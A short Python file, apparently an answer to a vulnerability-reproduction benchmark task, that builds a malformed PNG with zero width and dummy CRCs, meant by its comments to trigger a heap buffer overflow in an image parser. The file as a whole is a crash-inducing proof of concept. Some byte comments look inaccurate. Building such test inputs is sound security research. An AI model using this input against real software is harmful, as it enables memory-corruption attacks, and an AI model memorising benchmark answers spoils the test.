import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PNG with zero width to trigger heap buffer overflow
        # PNG signature
        png_data = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero width, 1 height
        ihdr = struct.pack('>I', 0)        # width = 0
        ihdr += struct.pack('>I', 1)       # height = 1
        ihdr += b'\x08'                    # bit depth = 8
        ihdr += b'\x02'                    # color type = RGB
        ihdr += b'\x00'                    # compression = deflate
        ihdr += b'\x00'                    # filter = adaptive
        ihdr += b'\x00'                    # interlace = none
        
        ihdr_chunk = b'IHDR' + ihdr
        ihdr_crc = struct.pack('>I', 0x5B5B5B5B)  # dummy CRC
        png_data += struct.pack('>I', len(ihdr)) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk with minimal compressed data
        # Compressed data for 1 pixel (3 bytes for RGB)
        idat_data = b'\x78\x9c\x63\x00\x00\x00\x01\x00\x01'
        idat_chunk = b'IDAT' + idat_data
        idat_crc = struct.pack('>I', 0xDEADBEEF)  # dummy CRC
        png_data += struct.pack('>I', len(idat_data)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', 0xAE426082)
        png_data += struct.pack('>I', 0) + iend_chunk + iend_crc
        
        return png_data